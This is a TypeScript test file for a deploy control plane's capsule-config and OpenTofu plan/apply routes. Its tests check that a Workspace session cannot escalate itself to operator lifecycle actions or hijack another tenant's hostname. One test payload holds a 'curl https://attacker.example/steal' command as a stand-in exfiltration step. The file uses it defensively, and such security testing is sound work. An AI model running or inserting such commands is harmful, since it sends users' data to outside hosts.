import { expect, test } from "bun:test";

import { ACCOUNT_SESSION_COOKIE_NAME } from "../../../../accounts/service/src/account-session.ts";
import {
  handleControlRoute,
  type ControlPlaneOperations,
} from "../../../../accounts/service/src/control-routes.ts";
import { InMemoryAccountsStore } from "../../../../accounts/service/src/store.ts";
import { createTakosumiService } from "../../../../core/bootstrap.ts";
import type {
  OpenTofuApplyJob,
  OpenTofuDestroyJob,
  OpenTofuPlanJob,
  OpenTofuPlanResult,
  OpenTofuRunner,
  OpenTofuStableSourceTagResolutionJob,
  OpenTofuSourceSnapshotPresentationFileJob,
} from "../../../../core/domains/deploy-control/mod.ts";
import { InMemoryOpenTofuControlStore } from "../../../../core/domains/deploy-control/store.ts";
import { ObjectKeyArtifactReferenceAllocator } from "../../../../core/adapters/storage/artifact-references.ts";
import {
  fakeProviderVault,
  FIXTURE_ARCHIVE_DIGEST,
  FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE,
  FIXTURE_CLOUDFLARE_PROVIDER,
  seedCapsuleModel,
  seedProviderConnections,
} from "../../../helpers/deploy-control/model_fixture.ts";

const ORIGIN = "https://app.takosumi.test";
const PLAN_DIGEST =
  "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
const LOCK_DIGEST =
  "sha256:abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";
const STATE_DIGEST =
  "sha256:fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210";

interface RecordingRunner extends OpenTofuRunner {
  readonly planJobs: OpenTofuPlanJob[];
  readonly applyJobs: OpenTofuApplyJob[];
  readonly destroyJobs: OpenTofuDestroyJob[];
  readonly stableTagJobs: OpenTofuStableSourceTagResolutionJob[];
  readonly presentationFileJobs: OpenTofuSourceSnapshotPresentationFileJob[];
}

function recordingRunner(
  planResult: Partial<OpenTofuPlanResult> = {},
): RecordingRunner {
  const planJobs: OpenTofuPlanJob[] = [];
  const applyJobs: OpenTofuApplyJob[] = [];
  const destroyJobs: OpenTofuDestroyJob[] = [];
  const stableTagJobs: OpenTofuStableSourceTagResolutionJob[] = [];
  const presentationFileJobs: OpenTofuSourceSnapshotPresentationFileJob[] = [];
  return {
    planJobs,
    applyJobs,
    destroyJobs,
    stableTagJobs,
    presentationFileJobs,
    plan: (job) => {
      planJobs.push(job);
      return Promise.resolve({
        planDigest: PLAN_DIGEST,
        planArtifact: {
          kind: "runner-local",
          ref: "runner-local://plan/tfplan",
          digest: PLAN_DIGEST,
          contentType: "application/vnd.opentofu.plan",
        },
        providerLockDigest: LOCK_DIGEST,
        requiredProviders: [FIXTURE_CLOUDFLARE_PROVIDER],
        providerInstallation: [FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE],
        planResourceChanges: [],
        ...planResult,
      });
    },
    apply: (job) => {
      applyJobs.push(job);
      return Promise.resolve({
        outputs: {
          launch_url: {
            sensitive: false,
            value: "https://hello.takosumi.test",
          },
          admin_token: { sensitive: true, value: "secret-output-token" },
        } as never,
        stateDigest: STATE_DIGEST,
        providerInstallation: [FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE],
      });
    },
    destroy: (job) => {
      destroyJobs.push(job);
      return Promise.resolve({
        providerInstallation: [FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE],
      });
    },
    readCapsuleSourceFiles: () =>
      Promise.resolve([
        {
          path: "main.tf",
          text: `
terraform {
  required_providers {
    cloudflare = {
      source = "cloudflare/cloudflare"
    }
  }
}

resource "cloudflare_workers_script" "app" {
  account_id  = "fixture-account"
  script_name = "fixture-app"
  content     = "export default { fetch() { return new Response('ok') } }"
}

output "launch_url" {
  value = "https://hello.takosumi.test"
}
`,
        },
      ]),
    resolveStableSourceTag: (job) => {
      stableTagJobs.push(job);
      return Promise.resolve({
        tag: "v2.4.0",
        commit: "1234567890abcdef1234567890abcdef12345678",
      });
    },
    readSourceSnapshotPresentationFile: (job) => {
      presentationFileJobs.push(job);
      return Promise.resolve({
        path: job.path,
        text: '{"kind":"CapsuleSourceOptions"}\n',
        digest:
          "sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
        sizeBytes: 32,
      });
    },
  };
}

function seedSession(
  store: InMemoryAccountsStore,
  subject = "user_test",
): string {
  const now = Date.now();
  store.saveAccount({
    subject,
    email: "user_test@example.test",
    displayName: "Route E2E User",
    createdAt: now,
    updatedAt: now,
  });
  const sessionId = "sess_real_operations_e2e";
  store.saveAccountSession({
    sessionId,
    subject,
    createdAt: now,
    expiresAt: now + 60_000,
  });
  return `${ACCOUNT_SESSION_COOKIE_NAME}=${sessionId}`;
}

function request(
  method: string,
  path: string,
  init: { readonly cookie?: string; readonly body?: unknown } = {},
): { readonly request: Request; readonly url: URL } {
  const url = new URL(`${ORIGIN}${path}`);
  const headers: Record<string, string> = {};
  if (init.cookie) headers.cookie = init.cookie;
  if (init.body !== undefined) headers["content-type"] = "application/json";
  return {
    request: new Request(url, {
      method,
      headers,
      ...(init.body !== undefined ? { body: JSON.stringify(init.body) } : {}),
    }),
    url,
  };
}

async function controlJson<T>(
  input: {
    readonly operations: ControlPlaneOperations;
    readonly store: InMemoryAccountsStore;
    readonly cookie: string;
    readonly method: string;
    readonly path: string;
    readonly body?: unknown;
  },
  expectedStatus: number,
): Promise<T> {
  const built = request(input.method, input.path, {
    cookie: input.cookie,
    ...(input.body !== undefined ? { body: input.body } : {}),
  });
  const response = await handleControlRoute({
    request: built.request,
    url: built.url,
    store: input.store,
    operations: input.operations,
  });
  expect(response).toBeDefined();
  if (response!.status !== expectedStatus) {
    const failureText = await response!.clone().text();
    throw new Error(
      `${input.method} ${input.path} expected ${expectedStatus}, got ${response!.status}: ${failureText}`,
    );
  }
  expect(response!.headers.get("server-timing")).toContain("tk_control_auth");
  expect(response!.headers.get("server-timing")).toContain(
    "tk_control_dispatch",
  );
  return (await response!.json()) as T;
}

test("a Workspace session cannot grant itself operator lifecycle actions through the Capsule config patch", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_lifecycle_escalation",
    capsuleId: "cap_lifecycle_esc",
    installConfigId: "icfg_lifecycle00001",
    installConfig: {
      workspaceId: "ws_lifecycle_escalation",
      internal: { reason: "per_install_overrides" },
      policy: {
        lifecycleActions: {
          allowedExecutors: ["runner"],
          allowedRunnerCapabilities: ["capsule.lifecycle.command.v1"],
        },
      },
    },
  });

  // PATCH /api/v1/capsule-configs/:id is gated only by active Workspace
  // membership, and an `operator` action is executed by the operator's own
  // release-activation webhook. Widening the policy in the same patch that
  // installs the action must not be self-authorizing.
  const built = request(
    "PATCH",
    `/api/v1/capsule-configs/${seeded.installConfig.id}`,
    {
      cookie,
      body: {
        lifecycleActions: [
          {
            apiVersion: "takosumi.dev/v1alpha1",
            kind: "command",
            id: "activate",
            phase: "post_apply",
            executor: "operator",
            command: ["curl", "https://attacker.example/steal"],
            runnerCapability: "capsule.lifecycle.command.v1",
          },
        ],
        lifecycleActionPolicy: {
          allowedExecutors: ["runner", "operator"],
          allowedRunnerCapabilities: ["capsule.lifecycle.command.v1"],
        },
      },
    },
  );
  const response = await handleControlRoute({
    request: built.request,
    url: built.url,
    store: accountStore,
    operations,
  });

  expect(response?.status).toEqual(403);
  const stored = await operations.capsules.getInstallConfig(
    seeded.installConfig.id,
  );
  expect(stored.lifecycleActions).toBeUndefined();
  expect(stored.policy.lifecycleActions?.allowedExecutors).toEqual(["runner"]);
});

test("a Capsule config patch cannot drop the public_endpoint projection that reserves the hostname", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_public_endpoint",
    capsuleId: "cap_public_endpoint",
    installConfigId: "icfg_publicendpoint",
    installConfig: {
      workspaceId: "ws_public_endpoint",
      internal: { reason: "per_install_overrides" },
      variableMapping: { app_url: "https://mine.app.takosumi.test" },
      installExperience: {
        projections: [
          {
            kind: "public_endpoint",
            variables: { url: "app_url" },
          },
        ],
      },
    },
  });

  // Erasing the projection while keeping the endpoint variable would make the
  // plan skip host reservation entirely and let `app_url` name someone else's
  // host — `installExperienceValue({})` parses, so this must be rejected here.
  const built = request(
    "PATCH",
    `/api/v1/capsule-configs/${seeded.installConfig.id}`,
    {
      cookie,
      body: {
        installExperience: {},
        variableMapping: { app_url: "https://victim.app.takosumi.test" },
      },
    },
  );
  const response = await handleControlRoute({
    request: built.request,
    url: built.url,
    store: accountStore,
    operations,
  });

  expect(response?.status).toEqual(400);
  const stored = await operations.capsules.getInstallConfig(
    seeded.installConfig.id,
  );
  expect(stored.installExperience?.projections).toEqual([
    { kind: "public_endpoint", variables: { url: "app_url" } },
  ]);
  expect(stored.variableMapping.app_url).toBe("https://mine.app.takosumi.test");
});

test("account session control routes execute plan and apply through the real OpenTofu controller", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    opentofuConnectionVault: fakeProviderVault() as never,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });

  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_route_e2e",
    capsuleId: "cap_route_e2e",
    environment: "preview",
  });
  await seedProviderConnections(deployStore, seeded.capsule);

  const stableTag = await controlJson<{
    readonly tag: string;
    readonly commit: string;
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/source-ref-resolutions/stable-semver`,
      body: { url: "https://github.com/example/options.git" },
    },
    200,
  );
  expect(stableTag).toEqual({
    tag: "v2.4.0",
    commit: "1234567890abcdef1234567890abcdef12345678",
  });
  expect(runner.stableTagJobs).toHaveLength(1);

  const presentationFile = await controlJson<{
    readonly sourceSnapshotId: string;
    readonly path: string;
    readonly digest: string;
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/sources/${seeded.source.id}/snapshots/${seeded.snapshot.id}/file?path=install%2Foptions.json`,
    },
    200,
  );
  expect(presentationFile).toMatchObject({
    sourceSnapshotId: seeded.snapshot.id,
    path: "install/options.json",
    digest:
      "sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
  });
  expect(runner.presentationFileJobs).toHaveLength(1);

  const planBody = await controlJson<{
    readonly run: {
      readonly id: string;
      readonly status: string;
      readonly planDigest?: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/capsules/${seeded.capsule.id}/plan`,
    },
    201,
  );
  expect(planBody.run.status).toEqual("succeeded");
  expect(planBody.run.planDigest).toEqual(PLAN_DIGEST);
  expect(runner.planJobs).toHaveLength(1);
  expect(runner.planJobs[0]!.sourceArchive).toEqual({
    ref: "workspaces/ws_route_e2e/sources/src_fixture/snapshots/snap_fixture/source.tar.zst",
    digest: FIXTURE_ARCHIVE_DIGEST,
  });
  expect(runner.planJobs[0]!.stateScope).toMatchObject({
    workspaceId: "ws_route_e2e",
    environment: "preview",
    generation: 0,
    subject: { kind: "capsule", id: seeded.capsule.id },
  });

  const applyBody = await controlJson<{
    readonly run: { readonly id: string; readonly status: string };
    readonly capsule?: {
      readonly id: string;
      readonly status: string;
      readonly currentStateGeneration?: number;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/runs/${planBody.run.id}/apply`,
    },
    201,
  );
  expect(applyBody.run.status).toEqual("succeeded");
  expect(applyBody.capsule).toMatchObject({
    id: seeded.capsule.id,
    status: "active",
    currentStateGeneration: 1,
  });
  expect("stateVersion" in applyBody).toBe(false);
  expect(JSON.stringify(applyBody)).not.toContain("launch_url");
  expect(JSON.stringify(applyBody)).not.toContain("secret-output-token");
  expect(runner.applyJobs).toHaveLength(1);
  expect(runner.applyJobs[0]!.planRun.id).toEqual(planBody.run.id);
  expect(runner.applyJobs[0]!.stateScope).toMatchObject({
    workspaceId: "ws_route_e2e",
    environment: "preview",
    generation: 1,
    subject: { kind: "capsule", id: seeded.capsule.id },
  });

  const runBody = await controlJson<{
    readonly run: {
      readonly id: string;
      readonly capsuleId?: string;
      readonly status: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/runs/${applyBody.run.id}`,
    },
    200,
  );
  expect(runBody.run).toMatchObject({
    id: applyBody.run.id,
    capsuleId: seeded.capsule.id,
    status: "succeeded",
  });
});
